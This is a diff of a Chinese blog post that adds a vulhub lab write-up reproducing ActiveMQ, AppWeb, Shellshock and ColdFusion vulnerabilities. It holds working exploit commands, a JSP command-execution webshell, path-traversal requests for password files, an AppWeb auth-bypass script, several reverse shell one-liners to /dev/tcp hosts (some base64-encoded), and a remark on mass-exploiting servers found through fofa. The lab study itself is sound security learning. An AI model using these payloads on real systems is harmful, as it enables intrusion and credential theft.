@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="NSSCTF1, shiango">
+    <meta name="keywords" content="vulhub复现1, shiango">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>NSSCTF1 | shiango</title>
+    <title>vulhub复现1 | shiango</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">NSSCTF1</h1>
+                    <h1 class="description center-align post-title">vulhub复现1</h1>
                 </div>
             </div>
         </div>
@@ -432,8 +432,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/ctf%E8%B5%9B%E9%A2%98/">
-                                <span class="chip bg-color">ctf赛题</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
                     </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-04-29
+                    2022-07-10
                 </div>
                 
 
@@ -469,7 +469,193 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <p>前言：</p>
+<p>搭建靶场其实挺快的，就是我之前一直要用wmdk硬盘来搭建ubuntu一直显示分区无读写权限，后来就用iso重新下了，之后有需要再来琢磨。在kali和ubuntu里面都搭好了，花了点时间，下面开始记录学习过程。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h3 id="（1）activemq"><a href="#（1）activemq" class="headerlink" title="（1）activemq"></a>（1）activemq</h3><h4 id="CVE-2015-5254）复现"><a href="#CVE-2015-5254）复现" class="headerlink" title="(CVE-2015-5254）复现"></a>(CVE-2015-5254）复现</h4><h5 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h5><p>apache activemq是消息中间件，支持java消息服务，集群，springFramework等。Apache activeMQ5.13.0之前的5.x版本存在安全漏洞，是由于<strong>程序没有限制可在代理中反序列化的类</strong>。远程攻击者可以借助特制的序列化Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。</p>
+<p>影响Apache ActiveMQ 5.x ~ Apache ActiveMQ 5.13.0</p>
+<h5 id="二、漏洞复现（反序列化漏洞）"><a href="#二、漏洞复现（反序列化漏洞）" class="headerlink" title="二、漏洞复现（反序列化漏洞）"></a>二、漏洞复现（反序列化漏洞）</h5><p>8161是web管理页面端口，61616是工作端口</p>
+<p>复现环境：</p>
+<table>
+<thead>
+<tr>
+<th>角色</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>目标靶机</td>
+<td>192.168.227.131</td>
+</tr>
+<tr>
+<td>kali攻击机</td>
+<td>192.168.227.128</td>
+</tr>
+<tr>
+<td>VPS</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>这里的vps可以用kali 来替代，但是一般真实环境下会在vps服务器上面来<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1818091">反弹shell</a>，（在云上搭kali 不太现实），由于是测试环境，我就在kali上面完成。</p>
+<h5 id="三、漏洞利用："><a href="#三、漏洞利用：" class="headerlink" title="三、漏洞利用："></a>三、漏洞利用：</h5><p>首先生成序列化的有效负载，将他发送到端口61616，再访问web管理页面并读取序列化消息。</p>
+<h6 id="1-我们在kali上面下载jmet的java消息利用工具，然后在同目录下创建external文件夹："><a href="#1-我们在kali上面下载jmet的java消息利用工具，然后在同目录下创建external文件夹：" class="headerlink" title="1.我们在kali上面下载jmet的java消息利用工具，然后在同目录下创建external文件夹："></a>1.我们在kali上面下载jmet的java消息利用工具，然后在同目录下创建external文件夹：</h6><p>#下载jmet的jar包<br>wget <a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br>#创建external目录<br>mkdir external</p>
+<h6 id="2-在攻击机中执行命令，将有效负载发送到目标ip的61616端口："><a href="#2-在攻击机中执行命令，将有效负载发送到目标ip的61616端口：" class="headerlink" title="2.在攻击机中执行命令，将有效负载发送到目标ip的61616端口："></a>2.在攻击机中执行命令，将有效负载发送到目标ip的61616端口：</h6><p>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/sucess” -Yp ROME 192.168.227.131 61616</p>
+<p>【命令解释】：调用java -jar 运行 jmet的jar包，-Q是插入一个名为event的队列，-I 是选择装载ActiveMQ模块 ，-s 是选择ysoserial payload ，-Y 是攻击模式和内容， -Yp 是选择攻击利用链，这是选择是ROME， 之后带上IP加端口。</p>
+<h6 id="3-http-127-0-0-1-8161-admin-browse-jsp-JMSDestination-Event在目标靶机的浏览器中访问url查看队列中所有消息"><a href="#3-http-127-0-0-1-8161-admin-browse-jsp-JMSDestination-Event在目标靶机的浏览器中访问url查看队列中所有消息" class="headerlink" title="3.http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=Event在目标靶机的浏览器中访问url查看队列中所有消息"></a>3.<a target="_blank" rel="noopener" href="http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=Event%E5%9C%A8%E7%9B%AE%E6%A0%87%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E8%AE%BF%E9%97%AEurl%E6%9F%A5%E7%9C%8B%E9%98%9F%E5%88%97%E4%B8%AD%E6%89%80%E6%9C%89%E6%B6%88%E6%81%AF">http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=Event在目标靶机的浏览器中访问url查看队列中所有消息</a></h6><p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-11%20112105.png" alt="屏幕截图 2022-07-11 112105"></p>
+<p>点击id即可触发漏洞</p>
+<h6 id="4-然后在靶机中进入容器："><a href="#4-然后在靶机中进入容器：" class="headerlink" title="4.然后在靶机中进入容器："></a>4.然后在靶机中进入容器：</h6><p>#登录容器环境<br>docker exec -it [容器ID] bash </p>
+<p>docker-<a target="_blank" rel="noopener" href="https://www.cnblogs.com/minseo/p/11548177.html">compose</a>（对Docker容器集群的快速编排） exec activemq bash（执行用户直接输入的命令）</p>
+<p>ls /tmp/即可看到目录下的sucess文件</p>
+<h6 id="5-kali反弹shell"><a href="#5-kali反弹shell" class="headerlink" title="5.kali反弹shell"></a>5.kali<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1818091">反弹shell</a></h6><p>bash命令直弹</p>
+<p>bash -i &gt;&amp; /dev/tcp/192.168.227.128/8888 0&gt;&amp;1</p>
+<p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNy4xMjgvODg4OCAwPiYxCgo=}|{base64,-d}|{bash,-i}</p>
+<p>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNy4xMjgvODg4OCAwPiYxCgo=}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.227.131 61616</p>
+<p><img src="/images/activemq2015.png" alt="activemq2015"></p>
+<p>反弹shell要将命令base64加密后发送，利用bash在目标机解密执行，不加密无法反弹shell .</p>
+<h6 id="6-再回到浏览器上面就触发id就可以发现监听的8888端口已经成功拿到root权限了"><a href="#6-再回到浏览器上面就触发id就可以发现监听的8888端口已经成功拿到root权限了" class="headerlink" title="6.再回到浏览器上面就触发id就可以发现监听的8888端口已经成功拿到root权限了"></a>6.再回到浏览器上面就触发id就可以发现监听的8888端口已经成功拿到root权限了</h6><p><img src="/images/root%E6%9D%83%E9%99%90.png" alt="root权限"></p>
+<h5 id="四、利用限制"><a href="#四、利用限制" class="headerlink" title="四、利用限制"></a>四、利用限制</h5><p>1）.版本符合<br>2）.立即执行代码：能够通过弱密码登录查看<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97&spm=1001.2101.3001.7020">消息队列</a><br>3）.没有查看队列所有消息的用户名和密码下，只能管理员/用户去点击我们插入的消息才能触发（但可以写入创建用户命令等待管理员点击查看，概率很大）</p>
+<h5 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h5><p>如四所说，在没有管理员密码的情况下面我们只能通过诱导其触发我们的链接，或者伪装成来自其他服务的合法消息，用户命令需要等待客户端访问时才能触发。</p>
+<h4 id="任意文件上传漏洞（CVE-2016-3088）"><a href="#任意文件上传漏洞（CVE-2016-3088）" class="headerlink" title="任意文件上传漏洞（CVE-2016-3088）"></a>任意文件上传漏洞（CVE-2016-3088）</h4><p>这个漏洞的环境一直延时接不了，在ubuntu和kali上面都无法复现场景，所以我们先看看原理</p>
+<h5 id="一、背景-1"><a href="#一、背景-1" class="headerlink" title="一、背景"></a>一、背景</h5><p>ActiveMQ的web控制台分为三个应用，admin、api、fileserver,其中admin是管理员界面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
+<p>通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：1. 其使用率并不高2. 文件操作容易出现漏洞所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf/jetty.xml中开启之），之后的已经删除了这个应用。</p>
+<p>要看清楚activemq的版本。</p>
+<h5 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h5><p>漏洞出现在fileserver的应用中，原理很简单就是fileserver支持写入文件（但是不解析jsp文件），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
+<p>文件写入的方法：</p>
+<ol>
+<li><p>编写Webshell</p>
+<p>fileserver不解析jsp，admin和api都需要登录才能访问</p>
+</li>
+<li><p>写入cron或ssh key等文件</p>
+<p>直接反向Shell，但是需要root权限</p>
+</li>
+<li><p>编写jar或jetty.xml等库和配置文件</p>
+<p>写jar，有点麻烦（需要jar后门），写xml配置文件，这个方法比较靠谱，但是我们需要知道ActiveMQ的绝对路径</p>
+</li>
+</ol>
+<h5 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h5><p>访问的端口号依旧是8161管理端口，用于web端进行配置管理。</p>
+<p>业务端口61616用于生产消费数据</p>
+<p>然后我们开始利用复现：</p>
+<p>1.确定当前系统路径：/admin/test/systemProperties.jsp</p>
+<p>2.通过抓包，上传webshell返回204（空内容）fileserver路径下不解析</p>
+<p><strong>PUT /fileserver/2.txt HTTP/1.1</strong><br>Host: 192.168.13.132:8161<br>Accept: /<br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Length: 397<br><strong>&lt;%@ page import=”java.io.*” %&gt;</strong><br><strong>&lt;%**<br>**try {**<br>**String cmd = request.getParameter(“cmd”);**<br>**Process child = Runtime.getRuntime().exec(cmd);**<br>**InputStream in = child.getInputStream();**<br>**int c;**<br>**while ((c = in.read()) != -1) {**<br>**out.print((char)c);**<br>**}**<br>**in.close();**<br>**try {**<br>**child.waitFor();**<br>**} catch (InterruptedException e) {**<br>**e.printStackTrace();**<br>**}**<br>**} catch (IOException e) {**<br>**System.err.println(e);**<br>**}**<br>**%&gt;</strong></p>
+<p>3.移动webshell到可解析目录api下,返回204</p>
+<p><strong>MOVE /fileserver/2.txt HTTP/1.1</strong><br><strong>Destination: file:///opt/activemq/webapps/api/s.jsp</strong><br>Host: 192.168.13.132:8161<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3<br>Accept-Encoding: gzip, deflate<br>DNT: 1<br>Cookie: JSESSIONID=1xg7iymt54sps2nswn18zrh7h<br>Authorization: Basic YWRtaW46YWRtaW4=<br>Connection: close<br>Cache-Control: max-age=0</p>
+<p>4.访问/api/可以查看到s.jsp文件</p>
+<p>5.执行命令?cmd=whoami</p>
+<p>返回root权限</p>
+<p><img src="../images/image-20220712100719874.png" alt="image-20220712100719874"></p>
+<h3 id="（2-appweb"><a href="#（2-appweb" class="headerlink" title="（2)appweb"></a>（2)appweb</h3><h4 id="cve-2018-8715"><a href="#cve-2018-8715" class="headerlink" title="cve-2018-8715"></a>cve-2018-8715</h4><h5 id="一、背景-2"><a href="#一、背景-2" class="headerlink" title="一、背景"></a>一、背景</h5><p>appweb是一个嵌入式开发HTTP web服务器，它迅速（ 每秒处理3500多要求）而紧凑 ，其中包括支持动态网页制作，服务器端嵌入式脚本过程中的CGI ，可加载模块的SSL ，摘要式身份验证，虚拟主机， Apache样式配置，日志记录，单和多线程应用程序。</p>
+<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
+<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
+<ul>
+<li>basic 传统HTTP基础认证</li>
+<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
+<li>form 表单认证</li>
+</ul>
+<p>影响范围：APPweb7.0.2及早期版本</p>
+<h5 id="二、测试环境"><a href="#二、测试环境" class="headerlink" title="二、测试环境"></a>二、测试环境</h5><p>这次在kali上面进行复原测试</p>
+<h5 id="三、漏洞利用-1"><a href="#三、漏洞利用-1" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h5><h6 id="1-开启靶场，访问目标"><a href="#1-开启靶场，访问目标" class="headerlink" title="1.开启靶场，访问目标"></a>1.开启靶场，访问目标</h6><p>通过docker ps查看端口为8080</p>
+<h6 id="2-获取用户名"><a href="#2-获取用户名" class="headerlink" title="2.获取用户名"></a>2.获取用户名</h6><p>访问知道需要输入账号密码，就是要我们有已知用户名，当前环境下的用户名为‘admin’</p>
+<p>所以我们构造头<code>Authorization: Digest username=admin</code>，并发送如下数据包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Digest username=admin</span><br></pre></td></tr></table></figure>
+
+<p>注释：</p>
+<p>Authorization里面放的就是token，就相当于每次发送请求的时候，拦截器都会拦截一次你的请求，<br>把你请求头部的Authorization拿出来，与当前存在服务器上的token做对比<br>如果是同一个，则证明是同一用户，然后拦截器就为你当前的请求放行，继续执行你的请求<br>如果不是同一个，那么服务器会截断你的请求并发送错误码给前端，让前端验证身份重新登陆</p>
+<p><img src="../images/appweb.png" alt="appweb"></p>
+<p>可见由于我们没有输入密码字段，所以服务端出现错误，直接返回了200，并且所以这步执行完之后我们可以获得session值</p>
+<h6 id="3-post发包登陆"><a href="#3-post发包登陆" class="headerlink" title="3.post发包登陆"></a>3.post发包登陆</h6><p><img src="../images/appweb2.png" alt="appweb2"></p>
+<h5 id="四、延伸思考"><a href="#四、延伸思考" class="headerlink" title="四、延伸思考"></a>四、延伸思考</h5><p>因为不清楚服务器的appweb用户名，所以我们没有办法在一个服务器里批量利用，但是如果指定一个用户名，再去找那些装有appweb的服务器就可以批量利用了，这也就是指纹问题。所以我们只是需要找到关键特征利用，然后写一个poc，就可以实现</p>
+<p>HTTP头里有一个“WWW-Authenticate:Digest…..”的内容</p>
+<p>在fofa里面找到大量的服务器，看WWW-Authenticate内容差不多，但不确定是否真实存在的Appweb，也不知道Appweb的版本，但是这样做至少把范围缩小了，并且可以通过假定一个用户名进行批量利用了。</p>
+<p><img src="../images/image-20220712171458286.png" alt="image-20220712171458286"></p>
+<p>poc是网上借鉴一位大佬的：</p>
+<p>import requests<br>import sys</p>
+<p>print ‘’’<br>    Userage: python appweb.py <a target="_blank" rel="noopener" href="http://192.168.0.11:8080/">http://192.168.0.11:8080/</a> joshua<br>    ‘’’</p>
+<p>url = sys.argv[1]<br>user = sys.argv[2]</p>
+<p>headers = {<br>    ‘User-Agent’:’Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36’,<br>    ‘Authorization’:’Digest username=’+user<br>    }</p>
+<p>response = requests.post(url,headers=headers)</p>
+<p>if(response.status_code == 200):<br>    print response.headers[‘Set-Cookie’]<br>else:<br>    print “No Vul ,CVE-2018-8715!”</p>
+<h3 id="（3）Aria2-（任意文件写入漏洞）"><a href="#（3）Aria2-（任意文件写入漏洞）" class="headerlink" title="（3）Aria2 （任意文件写入漏洞）"></a>（3）Aria2 （任意文件写入漏洞）</h3><h5 id="一、背景-3"><a href="#一、背景-3" class="headerlink" title="一、背景"></a>一、背景</h5><p>Aria2是一个命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。Aria提供RPC服务器，通过–enable-rpc参数启动.Aria2的RPC服务器可以方便的添加，删除下载项目。</p>
+<p>在有权限的情况下，我们可以使用<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/187560185">RPC</a>（远程过程调用协议，<strong>RPC协议的主要目的是做到不同服务间调用方法像同一服务间调用本地方法一样</strong>）接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞。</p>
+<p>可以让攻击通过控制文件下载链接，文件储存路径以及文件名，直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。同时通过Aria2提供的其他功能，诸如save-session等也能轻易地实现任意文件写入指定功能。</p>
+<h5 id="二、漏洞环境"><a href="#二、漏洞环境" class="headerlink" title="二、漏洞环境"></a>二、漏洞环境</h5><p>攻击机：ubuntu 192.168.227.131</p>
+<p>靶机：kali 192.168.227.128：6800</p>
+<h5 id="三、漏洞利用-2"><a href="#三、漏洞利用-2" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h5><h6 id="1-抓包回显404错误"><a href="#1-抓包回显404错误" class="headerlink" title="1.抓包回显404错误"></a>1.抓包回显404错误</h6><h6 id="2-利用工具"><a href="#2-利用工具" class="headerlink" title="2.利用工具"></a>2.利用工具</h6><p>因为<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=rpc&spm=1001.2101.3001.7020">rpc</a>通信需要使用json或者xml，不太方便，所以我们可以借助第三方UI来和目标通信，如 <a target="_blank" rel="noopener" href="http://binux.github.io/yaaw/demo/%E8%AE%BF%E9%97%AE%E8%BF%99%E4%B8%AAUI%EF%BC%8C%E7%82%B9%E5%87%BB%E8%BF%99%E4%B8%AA%E5%B0%8F%E6%89%B3%E6%89%8B%EF%BC%88settings%EF%BC%89%EF%BC%8C%E6%B7%BB%E5%8A%A0%E4%BD%A0%E7%9A%84%E9%9D%B6%E5%9C%BA%E5%9F%9F%E5%90%8D">http://binux.github.io/yaaw/demo/访问这个UI，点击这个小扳手（settings），添加你的靶场域名</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangxiao93/article/details/52705642">(71条消息) Linux　nc 命令详解_NearXDU的博客-CSDN博客_nc命令详解</a></p>
+<h4 id="4-bash安全漏洞"><a href="#4-bash安全漏洞" class="headerlink" title="(4)bash安全漏洞"></a>(4)bash安全漏洞</h4><p>shellshock破壳漏洞CVE-2014-6271</p>
+<p>背景：Bash&lt;=4.3；8080端口，存在victim.cgi文件</p>
+<ul>
+<li><p>shellshock即unix 系统下的bash shell的一个漏洞，Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
+</li>
+<li><p>bash使用的环境变量是通过函数名称来调用的，以“(){”开头通过环境变量来定义，而在处理这样的恶意的函数环境变量时，并没有以函数结尾 “}” 为结束，而是执行其后的恶意shell命令。</p>
+</li>
+<li><p>执行CGI 时会调用Bash<strong>将Referer、host、UserAgent、header等作为环境变量</strong>进行处理</p>
+<p>靶机环境：kali</p>
+<p>攻击机：ubuntu</p>
+<p>exp:</p>
+<p>通过抓包修改User-Agent为</p>
+<p>(1)</p>
+<p>() { :;};echo ; echo; echo $(/bin/ls /);</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(2)User-Agent: () &#123; :;&#125;;echo;echo $(/bin/ls -al /);/usr/bin/id;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="/images/bash.png" alt="bash"></p>
+<p><img src="/images/bash2.png" alt="bash2"></p>
+<p>反弹shell:利用bp发包到ubuntu监听的4444端口：</p>
+<p>{ :; }; /bin/bash -i &gt;&amp; /dev/tcp/192.168.118.1/4444 0&gt;&1;</p>
+<p><img src="/images/bash3.png" alt="bash3"></p>
+<ol>
+<li>此漏洞可以绕过ForceCommand在sshd中的配置，从而<strong>执行任意命令</strong>；</li>
+<li>如果CGI脚本用Bash编写，则使用mod_cgi或mod_cgid的Apache服务器会受到影响；</li>
+<li>DHCP客户端调用shell脚本来配置系统，可能存在允许任意命令执行；</li>
+<li>各种daemon和SUID/privileged的程序都可能执行shell脚本，通过用户设置或影响环境变量值，允许任意命令运行。</li>
+</ol>
+<h4 id="（5）Adobe-coldfusion"><a href="#（5）Adobe-coldfusion" class="headerlink" title="（5）Adobe coldfusion"></a>（5）Adobe coldfusion</h4><h5 id="1-CVE-2010-2861-文件读取漏洞"><a href="#1-CVE-2010-2861-文件读取漏洞" class="headerlink" title="1.(CVE-2010-2861)文件读取漏洞"></a>1.(CVE-2010-2861)文件读取漏洞</h5><p>背景：</p>
+<p>Adobe ColdFusion是美国Adobe公司的一款<strong>动态Web服务器产品</strong>，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>
+<p>Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。</p>
+<p>由于AJP协议设计存在缺陷导致内部相关的属性可控，攻击者可以构造属性值，使未授权的用户读取服务器任意文件获得敏感信息，甚至可以进行远程代码执行漏洞的利用。</p>
+<p>漏洞利用：</p>
+<p>先登录页面，将密码初始化为admin</p>
+<p>然后</p>
+<p>poc：</p>
+<p>但是这里注意一个问题就是可能会出现因为url编码无法读取的情况，所以我们利用burp抓包然后直接访问，可读取文件/etc/passwd</p>
+<p>index.cfm?locale=../../../../../../../../../../etc/passwd%00en</p>
+<p><img src="/images/coldfusion.png" alt="coldfusion"></p>
+<p>读取后台管理员密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/CFIDE/administrator/index.cfm?locale=../../../../../../../lib/password.properties%00en</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/coldfusion2.png" alt="coldfusion2"></p>
+<p><img src="/images/coldfusion3.png" alt="coldfusion3"></p>
+<p>就直接读取到了，这里的用户名密码就是一个sha1类型的MD5加密。</p>
+<h5 id="2-coldfusion反序列化漏洞（CVE-2017-3066）"><a href="#2-coldfusion反序列化漏洞（CVE-2017-3066）" class="headerlink" title="2.coldfusion反序列化漏洞（CVE-2017-3066）"></a>2.coldfusion<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>漏洞（CVE-2017-3066）</h5><h6 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h6><p>影响版本：</p>
+<p>Adobe ColdFusion (2016 release) Update 3及之前的版本</p>
+<p>ColdFusion 11 Update 11及之前的版本</p>
+<p>ColdFusion 10 Update 22及之前的版本</p>
+<p>漏洞原理</p>
+<p>Adobe ColdFusion中存在<strong>java反序列化漏洞</strong>。攻击者可利用该漏洞在受影响应用程序的上下文中<strong>执行任意代码或造成拒绝服务</strong>。</p>
+<p>这个靶场一开始在复现环境时还以为是环境有问题，404，后来接着访问<a target="_blank" rel="noopener" href="http://x.x.x.x:8500/CFIDE/administrator/index.cfm%E5%8D%B3%E5%8F%AF">http://x.x.x.x:8500/CFIDE/administrator/index.cfm即可</a></p>
+<h6 id="具体利用如下："><a href="#具体利用如下：" class="headerlink" title="具体利用如下："></a>具体利用如下：</h6><p>利用</p>
+<p>（1）我们需要使用ColdFusionPwn工具来生成POC：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/codewhitesec/ColdFusionPwn/releases/download/0.0.1/ColdFusionPwn-0.0.1-SNAPSHOT-all.jar">ColdFusionPwn</a></li>
+</ul>
+<p>生成POC命令如下<br>java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-d367e379d9-1.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 ‘touch /tmp/success’ poc.ser<br>会在两个jar包当前所在目录生成一个 poc.ser 文件</p>
+<p>（2）访问 <a target="_blank" rel="noopener" href="http://your-ip:8500/flex2gateway/amf%EF%BC%8C%E5%B9%B6%E6%8A%93%E5%8C%85%E5%B0%86">http://your-ip:8500/flex2gateway/amf，并抓包将</a> Content-Type 改为application/x-amf，修改为 POST 协议,并添加刚刚生成的 poc.ser 文件</p>
+<p><a target="_blank" rel="noopener" href="http://your-ip:8500/flex2gateway/amf%EF%BC%8CContent-Type%E4%B8%BAapplication/x-amf%EF%BC%9A">http://your-ip:8500/flex2gateway/amf，Content-Type为application/x-amf：</a></p>
+<p>POST /flex2gateway/amf HTTP/1.1<br>Host: your-ip:8500<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-amf<br>Content-Length: 2853</p>
+<p>由于编码问题，如果直接从Notepad++/Notepad里面复制粘贴为body部分，是不成功的，即使返回的状态码是200，<br> 右击选择Paste From File，上传poc.cer文件</p>
+<p>（3）通过docekrid进入容器<br> Docker exec docker容器id -it /bin/bash（本机）</p>
+<p>success即为成功</p>
+<p>（4）反弹shell</p>
+<p>通过docekrid进入容器<br> 尝试反弹shell</p>
+<p>同时我们试一下，利用该漏洞反弹shell</p>
+<p>构造反弹命令</p>
+<p>bash -i &gt;&amp; /dev/tcp/X.X.X.X/7777 0&gt;&amp;1</p>
+<p>将其进行 base64 编码</p>
+<p>YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xOTIuOTkvNzc3NyAwPiYxIA==</p>
+<p>使用 ColdFusionPwn 工具再次生成 poc.ser</p>
+<p>java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-d367e379d9-1.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 ‘ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xOTIuOTkvNzc3NyAwPiYxIA==}|{base64,-d}|{bash,-i} ‘ poc.ser</p>
+<p>再次上传 poc.ser即可在靶机上面监听到了。</p>
+
                 
             </div>
             <hr/>
@@ -495,7 +681,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/04/29/NSSCTF1/">http://example.com/2022/04/29/NSSCTF1/</a>
+                    <a href="http://example.com/2022/07/10/vulhub%E5%A4%8D%E7%8E%B01/">http://example.com/2022/07/10/vulhub%E5%A4%8D%E7%8E%B01/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -533,8 +719,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/ctf%E8%B5%9B%E9%A2%98/">
-                                    <span class="chip bg-color">ctf赛题</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
                                 </a>
                             
                         </div>
@@ -706,17 +892,18 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
